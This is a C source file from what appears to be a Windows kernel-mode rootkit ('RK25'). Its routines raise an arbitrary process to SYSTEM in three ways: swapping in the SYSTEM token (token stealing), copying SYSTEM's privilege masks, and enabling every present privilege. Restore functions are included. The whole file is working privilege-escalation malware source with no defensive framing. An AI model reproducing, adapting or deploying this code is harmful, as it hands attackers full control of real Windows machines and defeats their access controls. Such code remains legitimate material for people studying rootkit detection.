#pragma once
#include "rk25_priv_process.h"

//#include <ntifs.h>

PRK25_LC glLCPrivProc = NULL;

VOID RK25PrivProcessInit() {
	glLCPrivProc = RK25ListInit(sizeof(RK25_PPD));
}
VOID RK25PrivProcessFree() {
	PRK25_PPD entry;
	do {
		entry = (PRK25_PPD)RK25ListEntryNext(glLCPrivProc);
		if (entry) RK25PrivProcessRestoreData(entry);
	} while (entry != NULL);
	RK25ListFree(glLCPrivProc);
}

BOOLEAN RK25PrivProcessSave(PRK25_PPD data) {
	return RK25ListAdd(glLCPrivProc, data);
}

PRK25_PPD RK25PrivProcessGet(HANDLE pid) {
	PRK25_PPD entry;
	do {
		entry = (PRK25_PPD)RK25ListEntryNext(glLCPrivProc);
		if (entry) if (entry->pid == pid) break;
	} while (entry != NULL);
	RK25ListFlush(glLCPrivProc);
	return entry;
}

NTSTATUS RK25PrivProcessUpStealing(HANDLE pid) {
	NTSTATUS status = STATUS_SUCCESS;
	RK25_PPD data = { 0 };
	PEPROCESS sysproc = RK25GetSystemEProcAddress();
	PEPROCESS userproc = RK25SearchEProcByPID(pid);
	if (!userproc) return STATUS_NOT_FOUND;

	//PSTR name = 

	if (RK25WindowsVersionOnlyUp(RK25_OS_VERSION_WIN_VISTA_SP0)) {
		PULONG_PTR* ppSysToken = RK25GetPTokenOfEProc(sysproc);
		PULONG_PTR* ppUserToken = RK25GetPTokenOfEProc(userproc);
		P_STP sysstp = RK25_PREF_TO_PTOKEN(ppSysToken);

		if (!ppSysToken || !userproc) return STATUS_NOT_FOUND;
		// up
		data.pointer = InterlockedExchangePointer(ppUserToken, *ppSysToken);
		// up nt/system
		data.stp.Enabled = InterlockedExchangePointer(&sysstp->Enabled, sysstp->Present);

		data.method = RK25_PRIV_PROCESS_STEAL_SYS;
		data.pid = pid;

		if (!RK25PrivProcessSave(&data)) {
			InterlockedExchangePointer(ppUserToken, data.pointer);
			InterlockedExchangePointer(&sysstp->Enabled, data.stp.Enabled);
			status = STATUS_UNSUCCESSFUL;
		}
	}
	else {
		/*
		* TODO: Win XP and Server 2003
		*/
		status = STATUS_UNSUCCESSFUL;
	}

	return status;
}

NTSTATUS RK25PrivProcessUpToSystem(HANDLE pid) {
	NTSTATUS status = STATUS_SUCCESS;
	RK25_PPD data = { 0 };
	PEPROCESS sysproc, userproc = RK25SearchEProcByPID(pid);
	if (!userproc) return STATUS_NOT_FOUND;
	sysproc = RK25GetSystemEProcAddress();
	if (!sysproc) return STATUS_NOT_FOUND;

	if (RK25WindowsVersionOnlyUp(RK25_OS_VERSION_WIN_VISTA_SP0)) {
		PULONG_PTR* ppUserToken = RK25GetPTokenOfEProc(userproc);
		PULONG_PTR* ppSysToken = RK25GetPTokenOfEProc(sysproc);
		if (sysproc && userproc) {
			P_STP userstp = RK25_PREF_TO_PTOKEN(ppUserToken);
			P_STP sysstp = RK25_PREF_TO_PTOKEN(ppSysToken);

			// priv up
			data.stp.Present = InterlockedExchange64(&userstp->Present, sysstp->Present);
			data.stp.Enabled = InterlockedExchange64(&userstp->Enabled, sysstp->Present);

			data.method = RK25_PRIV_PROCESS_TO_SYS;
			data.pid = pid;

			if (!RK25PrivProcessSave(&data)) {
				data.stp.Present = InterlockedExchange64(&userstp->Present, data.stp.Present);
				data.stp.Enabled = InterlockedExchange64(&userstp->Enabled, data.stp.Enabled);
				status = STATUS_UNSUCCESSFUL;
			}
		}
		else status = STATUS_UNSUCCESSFUL;
	}
	else {
		/*
		* TODO: Win XP and Server 2003
		*/
		status = STATUS_UNSUCCESSFUL;
	}

	return status;
}

NTSTATUS RK25PrivProcessUpModify(HANDLE pid) {
	NTSTATUS status = STATUS_SUCCESS;
	RK25_PPD data = { 0 };
	PEPROCESS userproc = RK25SearchEProcByPID(pid);
	if (!userproc) return STATUS_NOT_FOUND;

	if (RK25WindowsVersionOnlyUp(RK25_OS_VERSION_WIN_VISTA_SP0)) {
		PULONG_PTR* ppUserToken = RK25GetPTokenOfEProc(userproc);
		if (ppUserToken) {
			P_STP stp = RK25_PREF_TO_PTOKEN(ppUserToken);

			// priv up
			data.stp.Enabled = InterlockedExchange64(&stp->Enabled, stp->Present);
			data.method = RK25_PRIV_PROCESS_MODIFY;
			data.pid = pid;

			if (!RK25PrivProcessSave(&data)) {
				InterlockedExchange64(&stp->Enabled, data.stp.Enabled);
				status = STATUS_UNSUCCESSFUL;
			}
		}
		else status = STATUS_UNSUCCESSFUL;
	}
	else {
		/*
		* TODO: Win XP and Server 2003
		*/
		status = STATUS_UNSUCCESSFUL;
	}

	return status;
}

NTSTATUS RK25PrivProcessRestore(HANDLE pid) {
	return RK25PrivProcessRestoreData(RK25PrivProcessGet(pid));
}

NTSTATUS RK25PrivProcessRestoreData(PRK25_PPD data) {
	NTSTATUS status = STATUS_SUCCESS;
	if (!data) return STATUS_INVALID_PARAMETER;

	if (data->method & RK25_PRIV_PROCESS_MODIFY) {
		if (RK25WindowsVersionOnlyUp(RK25_OS_VERSION_WIN_VISTA_SP0)) {
			PEPROCESS userproc = RK25SearchEProcByPID(data->pid);
			PULONG_PTR* pUserToken = RK25GetPTokenOfEProc(userproc);
			P_STP stp = RK25_PREF_TO_PTOKEN(pUserToken);

			InterlockedExchange64(&stp->Enabled, data->stp.Enabled);

			RK25ListEntryDel(glLCPrivProc, data);
			RK25ListFlush(glLCPrivProc);
		}
		else {
			/*
			* TODO: Win XP and Win Server 2003
			*/
			status = STATUS_UNSUCCESSFUL;
		}
	}
	else if (data->method & RK25_PRIV_PROCESS_TO_SYS) {
		if (RK25WindowsVersionOnlyUp(RK25_OS_VERSION_WIN_VISTA_SP0)) {
			PEPROCESS userproc = RK25SearchEProcByPID(data->pid);
			PULONG_PTR* ppUserToken = RK25GetPTokenOfEProc(userproc);
			P_STP stp = RK25_PREF_TO_PTOKEN(ppUserToken);

			InterlockedExchange64(&stp->Present, data->stp.Present);
			InterlockedExchange64(&stp->Enabled, data->stp.Enabled);

			RK25ListEntryDel(glLCPrivProc, data);
			RK25ListFlush(glLCPrivProc);
		}
		else {
			/*
			* TODO: Win XP and Win Server 2003
			*/
			status = STATUS_UNSUCCESSFUL;
		}
	}
	else if (data->method & RK25_PRIV_PROCESS_STEAL_SYS) {
		if (RK25WindowsVersionOnlyUp(RK25_OS_VERSION_WIN_VISTA_SP0)) {
			PEPROCESS userproc = RK25SearchEProcByPID(data->pid);
			PULONG_PTR* ppUserToken = RK25GetPTokenOfEProc(userproc);
			P_STP stp = RK25_PREF_TO_PTOKEN(ppUserToken);

			InterlockedExchangePointer(&stp->Enabled, data->stp.Enabled);
			InterlockedExchange64(ppUserToken, data->pointer);

			RK25ListEntryDel(glLCPrivProc, data);
			RK25ListFlush(glLCPrivProc);
		}
		else {
			/*
			* TODO: Win XP and Win Server 2003
			*/
			status = STATUS_UNSUCCESSFUL;
		}
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}